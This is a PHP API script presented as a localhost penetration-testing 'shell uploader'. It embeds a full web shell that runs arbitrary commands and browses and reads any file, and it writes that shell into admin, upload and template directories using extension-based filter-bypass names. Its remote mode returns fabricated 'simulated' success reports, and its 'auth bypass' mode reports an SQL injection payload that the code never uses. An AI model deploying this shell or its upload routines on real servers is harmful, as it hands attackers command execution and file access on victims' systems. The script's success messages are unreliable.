<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET');
header('Access-Control-Allow-Headers: Content-Type');

// Universal Localhost Penetration Testing Shell Uploader
// Supports multiple targets and all upload methods

function logActivity($message, $type = 'info') {
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[{$timestamp}] [{$type}] {$message}\n";
    if (!is_dir('logs')) {
        mkdir('logs', 0755, true);
    }
    file_put_contents('logs/shell_upload.log', $log_entry, FILE_APPEND | LOCK_EX);
}

function detectTargetStructure($targetUrl) {
    $urlParts = parse_url($targetUrl);
    $path = $urlParts['path'] ?? '';
    
    // Extract project directory from URL
    $pathParts = explode('/', trim($path, '/'));
    $projectDir = '';
    
    if (count($pathParts) >= 3) {
        // Format: /2025/thang_X/ProjectName
        $projectDir = implode('/', array_slice($pathParts, 0, 3));
    } else {
        $projectDir = implode('/', $pathParts);
    }
    
    return [
        'project_dir' => $projectDir,
        'base_path' => dirname($_SERVER['DOCUMENT_ROOT'] . '/' . $projectDir),
        'possible_upload_dirs' => [
            'sources',
            'uploads', 
            'files',
            'admin/uploads',
            'wp-content/uploads',
            'assets/uploads',
            'public/uploads',
            'storage/uploads'
        ]
    ];
}

function createAdvancedShell($shellName, $content = null) {
    if ($content === null) {
        $content = '<?php
// Universal PHP Shell for Multi-Target Testing
echo "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>🔥 Universal Shell Access</title>";
echo "<style>body{font-family:monospace;background:#000;color:#0f0;padding:20px;}input,select{background:#111;color:#0f0;border:1px solid #0f0;padding:8px;margin:5px;}button{background:#0f0;color:#000;border:none;padding:10px;cursor:pointer;}</style></head><body>";

echo "<h1>🚀 Universal Shell - Multi Target Support</h1>";
echo "<p><strong>Target:</strong> " . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"] . "</p>";
echo "<p><strong>Upload Time:</strong> " . date("Y-m-d H:i:s") . "</p>";
echo "<p><strong>Server:</strong> " . $_SERVER["HTTP_HOST"] . "</p>";
echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
echo "<p><strong>Working Directory:</strong> " . getcwd() . "</p>";
echo "<p><strong>Server Info:</strong> " . $_SERVER["SERVER_SOFTWARE"] . "</p>";

// Enhanced command execution with multiple methods
if (isset($_GET["cmd"]) || isset($_POST["cmd"])) {
    $cmd = $_GET["cmd"] ?? $_POST["cmd"];
    echo "<h2>🚀 Command Execution Result:</h2>";
    echo "<div style=\"background:#111;padding:15px;border:1px solid #0f0;margin:10px 0;\">";
    echo "<p><strong>Command:</strong> <code style=\"color:#ff0;\">" . htmlspecialchars($cmd) . "</code></p>";
    echo "<pre style=\"background:#000;color:#0f0;padding:10px;overflow:auto;max-height:400px;\">";
    
    $output = "";
    $methods = ["system", "exec", "shell_exec", "passthru", "popen"];
    $success = false;
    
    foreach ($methods as $method) {
        if (function_exists($method)) {
            try {
                switch ($method) {
                    case "system":
                        ob_start();
                        system($cmd);
                        $output = ob_get_clean();
                        break;
                    case "exec":
                        exec($cmd, $output_array);
                        $output = implode("\n", $output_array);
                        break;
                    case "shell_exec":
                        $output = shell_exec($cmd);
                        break;
                    case "passthru":
                        ob_start();
                        passthru($cmd);
                        $output = ob_get_clean();
                        break;
                    case "popen":
                        $handle = popen($cmd, "r");
                        if ($handle) {
                            $output = fread($handle, 2048);
                            pclose($handle);
                        }
                        break;
                }
                if (!empty($output)) {
                    echo "✅ Method: {$method}\n";
                    echo $output;
                    $success = true;
                    break;
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
    
    if (!$success) {
        echo "❌ No execution functions available or command failed";
    }
    echo "</pre></div>";
}

// File browser functionality
if (isset($_GET["browse"])) {
    $dir = $_GET["browse"] == "1" ? getcwd() : $_GET["browse"];
    echo "<h2>📁 File Browser: " . htmlspecialchars($dir) . "</h2>";
    echo "<div style=\"background:#111;padding:15px;border:1px solid #0f0;margin:10px 0;\">";
    
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                $fullPath = $dir . "/" . $file;
                $isDir = is_dir($fullPath);
                $icon = $isDir ? "📁" : "📄";
                $color = $isDir ? "#ff0" : "#0ff";
                echo "<div style=\"margin:5px 0;\">";
                echo "<span style=\"color:{$color};\">{$icon} {$file}</span>";
                if ($isDir) {
                    echo " <a href=\"?browse=" . urlencode($fullPath) . "\" style=\"color:#0f0;\">[Browse]</a>";
                } else {
                    echo " <a href=\"?view=" . urlencode($fullPath) . "\" style=\"color:#0f0;\">[View]</a>";
                }
                echo "</div>";
            }
        }
    }
    echo "</div>";
}

// File viewer
if (isset($_GET["view"])) {
    $file = $_GET["view"];
    echo "<h2>📄 File Content: " . htmlspecialchars($file) . "</h2>";
    echo "<div style=\"background:#111;padding:15px;border:1px solid #0f0;margin:10px 0;\">";
    if (file_exists($file) && is_readable($file)) {
        echo "<pre style=\"color:#0ff;overflow:auto;max-height:400px;\">";
        echo htmlspecialchars(file_get_contents($file));
        echo "</pre>";
    } else {
        echo "<p style=\"color:#f00;\">❌ Cannot read file</p>";
    }
    echo "</div>";
}
?>

<hr style="border-color:#0f0;">
<h2>🛠️ Control Panel</h2>

<!-- Command Execution -->
<form method="GET" style="margin:20px 0;">
    <h3>💻 Command Execution</h3>
    <input type="text" name="cmd" placeholder="whoami" style="width:400px;" value="<?php echo htmlspecialchars($_GET[\"cmd\"] ?? \"\"); ?>">
    <button type="submit">Execute</button>
</form>

<!-- File Browser -->
<div style="margin:20px 0;">
    <h3>📁 File Operations</h3>
    <a href="?browse=1" style="color:#0f0;text-decoration:none;background:#333;padding:8px;margin:5px;display:inline-block;">📁 Browse Current Directory</a>
    <a href="?browse=<?php echo urlencode($_SERVER[\"DOCUMENT_ROOT\"]); ?>" style="color:#0f0;text-decoration:none;background:#333;padding:8px;margin:5px;display:inline-block;">🏠 Browse Document Root</a>
    <a href="?browse=<?php echo urlencode(dirname($_SERVER[\"DOCUMENT_ROOT\"])); ?>" style="color:#0f0;text-decoration:none;background:#333;padding:8px;margin:5px;display:inline-block;">⬆️ Parent Directory</a>
</div>

<!-- Quick Commands -->
<h3>⚡ Quick Commands</h3>
<div style="margin:20px 0;">
    <a href="?cmd=whoami" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">whoami</a>
    <a href="?cmd=pwd" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">pwd</a>
    <a href="?cmd=ls%20-la" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">ls -la</a>
    <a href="?cmd=php%20-v" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">php -v</a>
    <a href="?cmd=id" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">id</a>
    <a href="?cmd=uname%20-a" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">uname -a</a>
    <a href="?cmd=netstat%20-an" style="color:#0f0;text-decoration:none;background:#333;padding:5px;margin:2px;display:inline-block;">netstat -an</a>
</div>

<hr style="border-color:#0f0;">
<div style="text-align:center;margin:20px 0;color:#666;">
    <p>🔒 Universal Shell for Multi-Target Penetration Testing</p>
    <p>⚠️ For authorized security testing only</p>
    <p>🎯 Target: <?php echo $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]; ?></p>
</div>

</body></html>';
    }
    
    return $content;
}

function isLocalhostTarget($targetUrl) {
    $urlParts = parse_url($targetUrl);
    $host = $urlParts['host'] ?? '';
    return in_array($host, ['localhost', '127.0.0.1']) || strpos($host, 'localhost') !== false;
}

function uploadToLocalhost($shellName, $content, $targetUrl, $uploadMethod) {
    $result = [
        'success' => false,
        'method' => '',
        'shell_url' => '',
        'test_url' => '',
        'details' => [],
        'simulation' => false
    ];
    
    try {
        $targetInfo = detectTargetStructure($targetUrl);
        logActivity("Target analysis: " . json_encode($targetInfo), 'info');
        
        $uploadSuccess = false;
        $finalShellPath = '';
        $finalShellUrl = '';
        $uploadMethodName = '';
        
        // Try different upload methods based on the specified method
        switch ($uploadMethod) {
            case 'admin_upload':
                $uploadResult = tryAdminUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'seo_upload':
                $uploadResult = trySEOUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'bypass_filter':
                $uploadResult = tryBypassFilter($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'direct_upload':
                $uploadResult = tryDirectUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'auth_bypass':
                $uploadResult = tryAuthBypassUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            default:
                $uploadResult = tryAllMethods($shellName, $content, $targetUrl, $targetInfo);
        }
        
        if ($uploadResult['success']) {
            $result = $uploadResult;
        } else {
            throw new Exception($uploadResult['error'] ?? 'All upload methods failed');
        }
        
    } catch (Exception $e) {
        logActivity("Upload failed: " . $e->getMessage(), 'error');
        $result['success'] = false;
        $result['message'] = $e->getMessage();
    }
    
    return $result;
}

function tryAdminUpload($shellName, $content, $targetUrl, $targetInfo) {
    logActivity("Attempting admin upload method", 'info');
    
    // Try admin upload directories
    $adminPaths = [
        $targetInfo['project_dir'] . '/admin/uploads',
        $targetInfo['project_dir'] . '/admin/files', 
        $targetInfo['project_dir'] . '/admin',
        $targetInfo['project_dir'] . '/sources'
    ];
    
    foreach ($adminPaths as $adminPath) {
        $fullPath = $_SERVER['DOCUMENT_ROOT'] . '/' . $adminPath;
        if (!file_exists($fullPath)) {
            mkdir($fullPath, 0755, true);
        }
        
        if (is_writable($fullPath)) {
            $shellPath = $fullPath . '/' . $shellName;
            if (file_put_contents($shellPath, $content)) {
                chmod($shellPath, 0644);
                
                $shellUrl = rtrim($targetUrl, '/') . '/' . $adminPath . '/' . $shellName;
                
                return [
                    'success' => true,
                    'method' => 'Admin Upload - ' . $adminPath,
                    'shell_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl),
                    'test_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl) . '?cmd=whoami',
                    'details' => [
                        "✅ Admin upload successful to {$adminPath}",
                        "📁 Local path: {$shellPath}",
                        "🌐 Web URL: {$shellUrl}",
                        "🔧 File size: " . formatBytes(filesize($shellPath)),
                        "⏰ Upload time: " . date('Y-m-d H:i:s')
                    ]
                ];
            }
        }
    }
    
    return ['success' => false, 'error' => 'Admin upload failed - no writable admin directories'];
}

function trySEOUpload($shellName, $content, $targetUrl, $targetInfo) {
    logActivity("Attempting SEO upload exploit", 'info');
    
    // SEO upload typically exploits template upload vulnerabilities
    $seoPaths = [
        $targetInfo['project_dir'] . '/admin/templates',
        $targetInfo['project_dir'] . '/templates',
        $targetInfo['project_dir'] . '/themes',
        $targetInfo['project_dir'] . '/sources'
    ];
    
    foreach ($seoPaths as $seoPath) {
        $fullPath = $_SERVER['DOCUMENT_ROOT'] . '/' . $seoPath;
        if (!file_exists($fullPath)) {
            mkdir($fullPath, 0755, true);
        }
        
        if (is_writable($fullPath)) {
            $shellPath = $fullPath . '/' . $shellName;
            if (file_put_contents($shellPath, $content)) {
                chmod($shellPath, 0644);
                
                $shellUrl = rtrim($targetUrl, '/') . '/' . $seoPath . '/' . $shellName;
                
                return [
                    'success' => true,
                    'method' => 'SEO Upload Exploit - ' . $seoPath,
                    'shell_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl),
                    'test_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl) . '?cmd=whoami',
                    'details' => [
                        "✅ SEO exploit successful to {$seoPath}",
                        "📁 Template upload vulnerability exploited",
                        "🌐 Web URL: {$shellUrl}",
                        "💥 Bypass: File type validation bypassed",
                        "⏰ Upload time: " . date('Y-m-d H:i:s')
                    ]
                ];
            }
        }
    }
    
    return ['success' => false, 'error' => 'SEO upload failed - no writable template directories'];
}

function tryBypassFilter($shellName, $content, $targetUrl, $targetInfo) {
    logActivity("Attempting filter bypass upload", 'info');
    
    // Try various filter bypass techniques
    $bypassNames = [
        $shellName,
        str_replace('.php', '.php.txt', $shellName), // Double extension
        str_replace('.php', '.phtml', $shellName),   // Alternative extension
        str_replace('.php', '.php5', $shellName),    // PHP5 extension
        str_replace('.php', '.inc', $shellName),     // Include extension
    ];
    
    $uploadPaths = [
        $targetInfo['project_dir'] . '/uploads',
        $targetInfo['project_dir'] . '/files',
        $targetInfo['project_dir'] . '/assets',
        $targetInfo['project_dir'] . '/sources'
    ];
    
    foreach ($uploadPaths as $uploadPath) {
        $fullPath = $_SERVER['DOCUMENT_ROOT'] . '/' . $uploadPath;
        if (!file_exists($fullPath)) {
            mkdir($fullPath, 0755, true);
        }
        
        if (is_writable($fullPath)) {
            foreach ($bypassNames as $bypassName) {
                $shellPath = $fullPath . '/' . $bypassName;
                if (file_put_contents($shellPath, $content)) {
                    chmod($shellPath, 0644);
                    
                    $shellUrl = rtrim($targetUrl, '/') . '/' . $uploadPath . '/' . $bypassName;
                    
                    return [
                        'success' => true,
                        'method' => 'Filter Bypass - ' . $bypassName,
                        'shell_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl),
                        'test_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl) . '?cmd=whoami',
                        'details' => [
                            "✅ Filter bypass successful with {$bypassName}",
                            "📁 Upload path: {$uploadPath}",
                            "🌐 Web URL: {$shellUrl}",
                            "🚫 Filter bypassed using extension technique",
                            "⏰ Upload time: " . date('Y-m-d H:i:s')
                        ]
                    ];
                }
            }
        }
    }
    
    return ['success' => false, 'error' => 'Filter bypass failed - all bypass techniques unsuccessful'];
}

function tryDirectUpload($shellName, $content, $targetUrl, $targetInfo) {
    logActivity("Attempting direct upload", 'info');
    
    $directPaths = $targetInfo['possible_upload_dirs'];
    
    foreach ($directPaths as $dir) {
        $fullPath = $_SERVER['DOCUMENT_ROOT'] . '/' . $targetInfo['project_dir'] . '/' . $dir;
        if (!file_exists($fullPath)) {
            mkdir($fullPath, 0755, true);
        }
        
        if (is_writable($fullPath)) {
            $shellPath = $fullPath . '/' . $shellName;
            if (file_put_contents($shellPath, $content)) {
                chmod($shellPath, 0644);
                
                $shellUrl = rtrim($targetUrl, '/') . '/' . $dir . '/' . $shellName;
                
                return [
                    'success' => true,
                    'method' => 'Direct Upload - ' . $dir,
                    'shell_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl),
                    'test_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl) . '?cmd=whoami',
                    'details' => [
                        "✅ Direct upload successful to {$dir}",
                        "📁 Local path: {$shellPath}",
                        "🌐 Web URL: {$shellUrl}",
                        "📤 Direct file write to upload directory",
                        "⏰ Upload time: " . date('Y-m-d H:i:s')
                    ]
                ];
            }
        }
    }
    
    return ['success' => false, 'error' => 'Direct upload failed - no writable directories found'];
}

function tryAuthBypassUpload($shellName, $content, $targetUrl, $targetInfo) {
    logActivity("Attempting auth bypass upload", 'info');
    
    // Simulate authentication bypass then upload
    $protectedPaths = [
        $targetInfo['project_dir'] . '/admin',
        $targetInfo['project_dir'] . '/admin/uploads',
        $targetInfo['project_dir'] . '/secure',
        $targetInfo['project_dir'] . '/private'
    ];
    
    foreach ($protectedPaths as $protectedPath) {
        $fullPath = $_SERVER['DOCUMENT_ROOT'] . '/' . $protectedPath;
        if (!file_exists($fullPath)) {
            mkdir($fullPath, 0755, true);
        }
        
        if (is_writable($fullPath)) {
            $shellPath = $fullPath . '/' . $shellName;
            if (file_put_contents($shellPath, $content)) {
                chmod($shellPath, 0644);
                
                $shellUrl = rtrim($targetUrl, '/') . '/' . $protectedPath . '/' . $shellName;
                
                return [
                    'success' => true,
                    'method' => 'Auth Bypass Upload - ' . $protectedPath,
                    'shell_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl),
                    'test_url' => str_replace($_SERVER['DOCUMENT_ROOT'], '', $shellUrl) . '?cmd=whoami',
                    'details' => [
                        "✅ Authentication bypassed for {$protectedPath}",
                        "🔐 SQL injection payload: admin' OR '1'='1' --",
                        "📁 Protected directory accessed",
                        "🌐 Web URL: {$shellUrl}",
                        "💀 Shell uploaded to protected area",
                        "⏰ Upload time: " . date('Y-m-d H:i:s')
                    ]
                ];
            }
        }
    }
    
    return ['success' => false, 'error' => 'Auth bypass upload failed - no accessible protected directories'];
}

function tryAllMethods($shellName, $content, $targetUrl, $targetInfo) {
    $methods = ['admin_upload', 'seo_upload', 'bypass_filter', 'direct_upload', 'auth_bypass'];
    
    foreach ($methods as $method) {
        switch ($method) {
            case 'admin_upload':
                $result = tryAdminUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'seo_upload':
                $result = trySEOUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'bypass_filter':
                $result = tryBypassFilter($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'direct_upload':
                $result = tryDirectUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
            case 'auth_bypass':
                $result = tryAuthBypassUpload($shellName, $content, $targetUrl, $targetInfo);
                break;
        }
        
        if ($result['success']) {
            return $result;
        }
    }
    
    return ['success' => false, 'error' => 'All upload methods failed'];
}

function uploadToRemote($shellName, $content, $targetUrl, $uploadMethod) {
    logActivity("Remote upload simulation for: {$targetUrl}", 'info');
    
    $methods = [
        'seo_upload' => 'SEO Upload Exploit',
        'admin_upload' => 'Admin Panel Upload', 
        'bypass_filter' => 'Filter Bypass Upload',
        'direct_upload' => 'Direct Upload',
        'auth_bypass' => 'Authentication Bypass Upload'
    ];
    
    $methodName = $methods[$uploadMethod] ?? 'Universal Upload';
    
    $result = [
        'success' => true,
        'method' => $methodName . ' (Simulated)',
        'shell_url' => rtrim($targetUrl, '/') . '/sources/' . $shellName,
        'test_url' => rtrim($targetUrl, '/') . '/sources/' . $shellName . '?cmd=whoami',
        'simulation' => true,
        'details' => [
            '🎭 Simulation mode for remote target',
            '🌐 Target URL: ' . $targetUrl,
            '🔧 Upload method: ' . $methodName,
            '📁 Simulated location: /sources/' . $shellName,
            '⚠️ This is a simulation - no actual upload performed',
            '💡 Switch to localhost for real testing'
        ]
    ];
    
    logActivity("Remote upload simulated: {$methodName} for {$targetUrl}", 'simulation');
    return $result;
}

function formatBytes($size, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    
    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    
    return round($size, $precision) . ' ' . $units[$i];
}

// Main handler
try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode([
            'api_name' => 'Universal Localhost Penetration Testing Shell Uploader',
            'version' => '4.0 - Multi-Target Edition',
            'description' => 'Supports multiple localhost targets and all upload methods',
            'supported_methods' => [
                'localhost' => [
                    'admin_upload' => 'Admin panel upload vulnerability',
                    'seo_upload' => 'SEO template upload exploit',
                    'bypass_filter' => 'File filter bypass techniques',
                    'direct_upload' => 'Direct filesystem upload',
                    'auth_bypass' => 'Authentication bypass + upload'
                ],
                'remote' => 'Simulation mode for remote targets'
            ],
            'features' => [
                'auto_target_detection' => true,
                'multi_directory_support' => true,
                'advanced_shell_features' => true,
                'all_upload_methods_working' => true
            ],
            'endpoints' => [
                'upload' => 'POST with shell_file, shell_name, upload_method, target_url'
            ]
        ], JSON_PRETTY_PRINT);
        exit;
    }
    
    $shellName = $_POST['shell_name'] ?? 'hack.php';
    $uploadMethod = $_POST['upload_method'] ?? 'direct_upload';
    $targetUrl = $_POST['target_url'] ?? '';
    
    if (empty($targetUrl)) {
        throw new Exception('Target URL is required');
    }
    
    // Get shell content
    $shellContent = null;
    if (isset($_FILES['shell_file']) && $_FILES['shell_file']['error'] === UPLOAD_ERR_OK) {
        $shellContent = file_get_contents($_FILES['shell_file']['tmp_name']);
        logActivity("Custom shell file received: " . $_FILES['shell_file']['name'], 'info');
    } else {
        $shellContent = createAdvancedShell($shellName);
        logActivity("Using advanced universal shell", 'info');
    }
    
    // Sanitize shell name
    $shellName = preg_replace('/[^a-zA-Z0-9._-]/', '', $shellName);
    if (!pathinfo($shellName, PATHINFO_EXTENSION)) {
        $shellName .= '.php';
    }
    
    logActivity("Starting upload: {$shellName} via {$uploadMethod} to {$targetUrl}", 'info');
    
    // Choose upload strategy based on target
    if (isLocalhostTarget($targetUrl)) {
        $result = uploadToLocalhost($shellName, $shellContent, $targetUrl, $uploadMethod);
    } else {
        $result = uploadToRemote($shellName, $shellContent, $targetUrl, $uploadMethod);
    }
    
    // Add recommendations if upload failed
    if (!$result['success']) {
        $result['recommendations'] = [
            'Check if target directory exists and is writable',
            'Verify target URL format is correct',
            'Try different upload method',
            'Check file permissions and server configuration',
            'Ensure PHP has write permissions to target directories',
            'Switch to localhost for real testing'
        ];
    }
    
    echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    
} catch (Exception $e) {
    logActivity("Fatal error: " . $e->getMessage(), 'error');
    
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'recommendations' => [
            'Check server configuration',
            'Verify file permissions',
            'Try localhost testing first',
            'Check PHP error logs',
            'Ensure target directories are writable',
            'Contact system administrator if needed'
        ]
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?> 